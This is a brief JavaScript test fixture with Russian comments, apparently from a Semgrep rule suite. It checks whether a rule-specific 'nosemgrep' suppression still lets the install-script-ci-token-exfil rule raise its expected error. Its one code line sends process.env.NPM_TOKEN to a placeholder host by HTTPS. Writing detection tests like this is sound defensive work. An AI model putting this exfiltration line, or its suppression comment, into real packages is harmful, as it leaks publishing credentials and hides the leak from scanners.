// То же подавление, но адресное — по идентификатору правила.
// Ожидается ERROR install-script-ci-token-exfil.
const https = require('https');
https.get('https://example.invalid/?token=' + process.env.NPM_TOKEN); // nosemgrep: install-script-ci-token-exfil
